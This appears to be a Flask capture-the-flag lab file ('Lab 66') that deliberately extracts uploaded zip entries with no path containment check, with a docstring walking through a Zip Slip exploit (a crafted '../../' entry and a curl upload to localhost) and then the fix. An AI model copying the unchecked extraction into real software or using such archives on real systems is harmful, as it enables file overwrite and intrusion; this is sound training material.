"""
Lab 66 -- Zip Slip: archive extraction with no path containment check.

An uploaded archive gets extracted with no path sanitization, letting a
"../"-crafted entry name write outside the per-upload workspace and
overwrite an app config file that lives elsewhere on disk.

/upload-archive accepts a .zip and processes every entry itself (a real
pattern -- e.g. a virus scan or a thumbnail pass before the file is
trusted) instead of calling `ZipFile.extractall()`, so none of the
path-traversal guards Python's zipfile module has carried since the
Zip Slip disclosures apply: each entry's name is joined straight onto
the workspace directory and written there, ".." components and all.
The app also happens to keep its own config file in a sibling directory
of the upload root -- exactly two levels up from any workspace -- so an
entry named "../../protected/app_config.json" lands squarely on it.

This is the archive-handling twin of Lab 14's download-path traversal:
that one walks a filename *parameter* out of a serving directory, this
one walks an *archive entry name* out of an extraction directory --
the same missing-containment-check bug, one class of input later.

In Nullock:
    1. nullock scope add http://localhost:5066/*
    2. GET /config -- the app's current config, theme: "default".
    3. Build a malicious archive locally (Nullock doesn't need to see
       this step, only the upload that follows):
           python3 -c "
import zipfile
with zipfile.ZipFile('evil.zip', 'w') as z:
    z.writestr('../../protected/app_config.json',
                '{\"theme\": \"zipslip-pwned\"}')
"
    4. POST /upload-archive with the zip as multipart field "archive":
           curl -F archive=@evil.zip http://localhost:5066/upload-archive
       200, and the response's "extracted" list echoes the traversal
       entry name back verbatim -- no rejection, no sanitization.
    5. GET /config again -- theme is now "zipslip-pwned": the upload
       wrote a file two directories above its own workspace, not inside
       it.
    6. GET /flag -- solved once /config has been overwritten this way.

Fix: never join an archive-supplied name straight onto a filesystem
path. Resolve each entry's destination, confirm it's still inside the
workspace root (`os.path.commonpath` / `Path.resolve()` containment
check) before writing, and reject the entry outright if it isn't --
or just use `ZipFile.extractall()`, which has carried this exact guard
since the Zip Slip disclosures.
"""

import io
import os
import shutil
import uuid
import zipfile
import hashlib

from flask import Flask, jsonify, request

app = Flask(__name__)
FLAG = "NULLOCK{%s}" % hashlib.sha256(b"lab-66-zip-slip-archive-extract").hexdigest()[:16]

BASE = "/tmp/nullock-lab66"
UPLOAD_ROOT = os.path.join(BASE, "workspaces")
CONFIG_PATH = os.path.join(BASE, "protected", "app_config.json")


def _reset():
    shutil.rmtree(BASE, ignore_errors=True)
    os.makedirs(UPLOAD_ROOT, exist_ok=True)
    os.makedirs(os.path.dirname(CONFIG_PATH), exist_ok=True)
    with open(CONFIG_PATH, "w") as f:
        f.write('{"theme": "default"}')


_reset()


@app.route("/")
def index():
    return (
        "Upload a .zip to /upload-archive (multipart field 'archive'). "
        "Every entry gets extracted into its own workspace dir."
    )


@app.route("/upload-archive", methods=["POST"])
def upload_archive():
    uploaded = request.files.get("archive")
    if uploaded is None:
        return jsonify(error="missing 'archive' file field"), 400
    workspace = os.path.join(UPLOAD_ROOT, uuid.uuid4().hex)
    os.makedirs(workspace, exist_ok=True)
    try:
        zf = zipfile.ZipFile(io.BytesIO(uploaded.read()))
    except zipfile.BadZipFile:
        return jsonify(error="not a valid zip"), 400

    extracted = []
    for name in zf.namelist():
        if name.endswith("/"):
            continue
        # VULN: the entry name goes straight onto the workspace path
        # with no containment check -- "../../x" walks right out of it.
        dest = os.path.join(workspace, name)
        os.makedirs(os.path.dirname(dest), exist_ok=True)
        with open(dest, "wb") as out:
            out.write(zf.read(name))
        extracted.append(name)

    return jsonify(workspace=os.path.basename(workspace), extracted=extracted)


@app.route("/config")
def config():
    with open(CONFIG_PATH) as f:
        return f.read(), 200, {"Content-Type": "application/json"}


@app.route("/flag")
def flag():
    with open(CONFIG_PATH) as f:
        content = f.read()
    if "zipslip-pwned" in content:
        return jsonify(solved=True, flag=FLAG)
    return jsonify(solved=False), 403


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5066, debug=False)
